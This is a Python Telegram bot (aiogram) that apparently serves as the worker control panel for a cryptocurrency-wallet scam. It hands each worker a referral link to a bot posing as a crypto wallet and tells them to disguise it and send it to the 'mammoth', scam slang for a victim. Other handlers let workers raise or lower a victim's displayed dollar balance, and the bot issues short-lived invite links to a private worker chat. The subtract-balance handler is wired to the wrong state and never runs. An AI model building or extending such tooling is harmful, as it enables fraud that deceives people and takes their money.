import time
import asyncio
import contextlib

from aiogram import Dispatcher, Bot, Router, F
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.filters import CommandStart, StateFilter
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
import aiosqlite

from app.config import Config
from app.db import Database
from app.keyboards import rkb, ikb
from app.middlewares import ConnectDB


class MoneyOperation(StatesGroup):
    add = State()
    minus = State()


router = Router(name=__name__)


@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(text="🏝 Привет! Ваша панель:", reply_markup=rkb.get_panel_rkb())


@router.message(F.text, StateFilter(None))
async def on_text(message: Message):
    text = message.text.lower()
    user = message.from_user

    if text.endswith("профиль"):
        await message.answer(text=f"""
Ваш профиль:

id = {str(user.id)}

Ссылка: https://t.me/CryptoWallet_RoboBot?start={str(user.id)}
        """, reply_markup=rkb.get_panel_rkb())
    elif text.endswith("наш чат"):
        current_time = int(time.time())
        expire_date = current_time + 15

        link = await message.bot.create_chat_invite_link(chat_id=-4179454653, expire_date=expire_date, member_limit=1)
        print(link)

        url_kb = InlineKeyboardBuilder()
        url_kb.button(text="📨 Присоединиться", url=link)

        await message.answer(text="У вас 15 секунд присоединиться", reply_markup=url_kb)
    elif text.endswith("ссылки"):
        await message.answer(text=f"""
Ваша личная ссылка: <code>https://t.me/CryptoWallet_RoboBot?start={str(user.id)}</code>

Замаскируйте её, и отправьте мамонту.
        """)


@router.callback_query(StateFilter(None))
async def answer(call: CallbackQuery, state: FSMContext):
    if "panel|" in call.data:
        mamont_id = int(call.data.split("|")[1])

        await call.message.answer(text=f"Панель управление мамонтом ({str(mamont_id)}):",
                                  reply_markup=ikb.get_panel_ikb(mamont_id=mamont_id))

    elif "add_balance|" in call.data:
        mamont_id = int(call.data.split("|")[1])

        await call.message.edit_text(text="Скок добавим долларов?", reply_markup=ikb.get_cancel_ikb())

        await state.set_state(MoneyOperation.add)
        await state.update_data(mamont_id=mamont_id)


    elif "minus_balance|" in call.data:
        mamont_id = int(call.data.split("|")[1])

        await call.message.edit_text(text="Скок отнимем долларов?", reply_markup=ikb.get_cancel_ikb())

        await state.set_state(MoneyOperation.minus)
        await state.update_data(mamont_id=mamont_id)


    elif call.data == "cancel":
        await state.clear()


@router.message(StateFilter(MoneyOperation.add))
async def add_money(message: Message, state: FSMContext, conn: aiosqlite.Connection):
    db = Database(connection=conn)

    count = message.text

    state_data = await state.get_data()
    mamont_id = state_data.get('mamont_id')

    if count.isdigit():
        await db.add_money(user_id=mamont_id, money=count)

        await message.answer(text=f"Выдано {count}$ !")

    await state.clear()


@router.message(StateFilter(MoneyOperation.add))
async def minus_money(message: Message, state: FSMContext, conn: aiosqlite.Connection):
    db = Database(connection=conn)

    count = message.text

    state_data = await state.get_data()
    mamont_id = state_data.get('mamont_id')

    if count.isdigit():
        await db.minus_money(user_id=mamont_id, money=count)

        await message.answer(text=f"Забрано {count}$ !")

    await state.clear()


async def main():
    bot = Bot(token=Config.WORKER_BOT_TOKEN, parse_mode=ParseMode.HTML)

    dp = Dispatcher()
    dp.include_router(router)
    dp.message.middleware(ConnectDB('db'))
    dp.callback_query.middleware(ConnectDB('db'))

    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == '__main__':
    with contextlib.suppress(KeyboardInterrupt, SystemExit, RuntimeError):
        asyncio.run(main())
